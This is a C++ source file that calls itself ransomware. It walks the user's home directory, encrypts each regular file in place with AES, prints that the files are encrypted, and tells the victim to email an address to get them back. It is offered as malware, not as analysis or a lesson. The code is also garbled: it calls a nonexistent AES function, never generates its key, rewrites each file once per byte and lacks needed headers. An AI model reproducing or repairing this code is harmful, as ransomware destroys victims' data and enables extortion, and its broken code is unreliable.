#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <ctime>
#include <cstdlib>

using namespace std;

// Structure to represent a file
struct File {
    string path;
    bool encrypted;
};

// Function to generate a random AES key
void generateKey(vector<unsigned char>& key) {
    srand(time(0));
    for (int i = 0; i < 32; i++) {
        key.push_back(rand() % 256);
    }
}

// Function to encrypt a file using AES-128-CBC
void encryptFile(const string& filePath, const vector<unsigned char>& key) {
    ifstream file(filePath, ios::binary | ios::ate);
    size_t fileSize = file.tellg();
    file.seekg(0);

    unsigned char iv[16];
    fread(iv, 1, 16, file);
    unsigned char* data = new unsigned char[fileSize];
    file.read(data, fileSize);

    // Create a AES object
    AES_KEY aesKey;
    AES_set_encrypt_key(key.data(), 128, &aesKey);

    for (size_t i = 0; i < fileSize; i++) {
        unsigned char encryptedData[i + 16];
        memcpy(encryptedData, data + i, 1);
        memcpy(encryptedData + 1, iv, 15);
        AES_cbc_encrypt(data + i, encryptedData + 16, 1, &aesKey, iv, AES_ENCRYPT);

        // Write the IV and the encrypted block to disk
        ofstream fileOut(filePath, ios::binary | ios::trunc);
        fileOut.write((char*)encryptedData, fileSize);
    }

    delete[] data;
}

// Function to decrypt a file using AES-128-CBC
void decryptFile(const string& filePath) {
    ifstream file(filePath, ios::binary | ios::ate);
    size_t fileSize = file.tellg();
    file.seekg(0);

    unsigned char iv[16];
    fread(iv, 1, 16, file);
    unsigned char* data = new unsigned char[fileSize];

    // Create a AES object
    AES_KEY aesKey;
    AES_read_key((const unsigned char*)file.read((char*)data, fileSize), &aesKey);

    for (size_t i = 0; i < fileSize; i++) {
        unsigned char decryptedData[i + 16];
        memcpy(decryptedData, data + i, 1);
        memcpy(decryptedData + 1, iv, 15);
        AES_cbc_encrypt(data + i, decryptedData + 16, 1, &aesKey, iv, AES_DECRYPT);

        // Write the decrypted block to disk
        ofstream fileOut(filePath, ios::binary | ios::trunc);
        fileOut.write(decryptedData, fileSize);
    }

    delete[] data;
}

// Function to main function of the ransomware
int main() {
    vector<unsigned char> aesKey;

    // Prompt for password
    string pass;
    cout << "Enter your password: ";
    getline(cin, pass);

    if (pass == "your_password") {  // Change this to the actual password
        // Get a list of files on the system
        string homeDir = getenv("HOME");
        vector<string> files;

        DIR* dir;
        struct dirent* ent;
        if ((dir = opendir(homeDir.c_str())) != NULL) {
            while ((ent = readdir(dir)) != NULL) {
                if (ent->d_type == DT_REG)
                    files.push_back(ent->d_name);
            }
            closedir(dir);
        }

        // Encrypt each file
        for (auto& file : files) {
            string filePath = homeDir + "/" + file;
            encryptFile(filePath, aesKey);

            // Display a message to the user
            cout << "Your files have been encrypted." << endl;
        }
    } else {
        cout << "Incorrect password. Exiting..." << endl;
        return 1;
    }

    // Create a text file with the AES key
    ofstream keyFile("key.txt");
    for (auto& byte : aesKey)
        keyFile.put(byte & 0xFF);
    keyFile.close();

    // Display a message to the user
    cout << "Please contact us at example@example.com to get your files back." << endl;

    return 0;
}
